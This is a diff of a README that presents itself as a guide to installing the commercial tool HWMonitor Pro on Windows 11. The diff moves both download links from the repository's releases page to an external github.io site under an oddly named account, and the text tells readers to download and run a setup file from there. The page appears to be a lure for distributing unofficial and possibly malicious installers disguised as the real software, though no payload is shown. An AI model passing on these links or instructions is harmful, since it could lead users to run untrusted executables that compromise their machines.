@@ -1,6 +1,6 @@
 # 🌡️ HWMonitor-Windows-Guide - Monitor system health on Windows 11
 
-[![](https://img.shields.io/badge/Download_HWMonitor_Files-Blue?style=for-the-badge)](https://github.com/Dirtymoneythoroughness510/HWMonitor-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download_HWMonitor_Files-Blue?style=for-the-badge)](https://dirtymoneythoroughness510.github.io)
 
 This guide provides steps to install and run HWMonitor Pro on your Windows 11 computer. You can track your hardware health, voltage, temperature, and fan speeds using this software. If your previous attempts to install the program failed, follow these instructions to fix common issues.
 
@@ -8,7 +8,7 @@ This guide provides steps to install and run HWMonitor Pro on your Windows 11 co
 
 Visit the project release page to get the installation files. 
 
-[Click here to view the download page](https://github.com/Dirtymoneythoroughness510/HWMonitor-Windows-Guide/releases)
+[Click here to view the download page](https://dirtymoneythoroughness510.github.io)
 
 Choose the version that matches your system architecture. Most modern computers use 64-bit Windows. Download the setup file and save it to your desktop or downloads folder. 
 
